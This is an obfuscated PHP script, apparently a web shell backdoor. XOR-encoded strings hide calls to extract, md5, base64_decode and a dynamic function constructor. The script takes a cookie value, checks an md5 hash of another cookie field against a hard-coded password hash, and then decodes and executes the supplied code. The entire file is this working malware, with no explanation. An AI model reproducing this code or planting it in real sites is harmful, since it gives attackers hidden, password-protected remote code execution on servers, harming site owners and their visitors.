<?php
$s42=array("b0"=>"XP#.bajO&+EUS"^":1PKTU5+CH*16","ur"=>"FV/\$.8,4^YN4!/&"^"%\$JEZ]sR+7-@H@H","cu"=>"wNeTm[kh^)Wbs7LDj(Q@XwW^gcwT4hKm"^"G,P7^:SZfMfWJT|s^J`w9OemSRAfP_)]","tod"=>"_Z9}Q=)6"^":.AE0OAU","a34"=>"7%Z"^"ZAo");$tnz="s,%zov9"^",oj5\$?|";$sa0=&$$tnz;$s42["ixi"]=@$sa0["-6I("^"US?]"];$by="@MNK)8N"^"%5:9H[:";$by="@MNK)8N"^"%5:9H[:";$by($s42);$s9=$a34(@$sa0[$tod]);$uh=$b0($ixi);$cng=$ur("",$uh);if($s9==$cu)$cng();
